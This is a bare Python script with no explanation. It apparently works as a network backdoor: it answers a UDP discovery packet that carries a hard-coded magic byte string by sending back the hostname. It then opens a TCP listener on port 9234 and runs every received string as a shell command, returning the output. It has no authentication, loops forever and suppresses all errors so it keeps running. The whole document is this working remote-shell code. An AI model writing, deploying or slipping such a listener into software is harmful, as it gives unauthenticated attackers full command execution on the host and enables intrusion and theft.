import os
import sys
import socket
import subprocess

PORT = 9234
EXCHANGE = b'\xe2\x90\x0f#t\xe3\x13\xd3Ac'

def broadcast():
    broadcast_server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    broadcast_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    broadcast_server.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    broadcast_server.bind(('', PORT))
    print('Waiting For Connection... ')
    while True:
        message, address = broadcast_server.recvfrom(8192)
        if message == EXCHANGE:
            broadcast_server.sendto(socket.gethostname().encode(), address)
            print('OK')
            break
    broadcast_server.close()

def serve():
    serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    host = socket.gethostname()
    serv.bind(('', PORT))
    serv.listen(2)

    print('Listening...')
    con, addr = serv.accept()
    while True:
        data = con.recv(4230).decode()
        print(data)
        output = subprocess.getoutput(data)
        if output == '':
            output = '<<No Output>>'
        print('DONE')
        con.send(output.encode())
        print('SENT')
    con.close()

if __name__ == '__main__':
    while True:
        try:
            broadcast()
            serve()
        except:
            pass
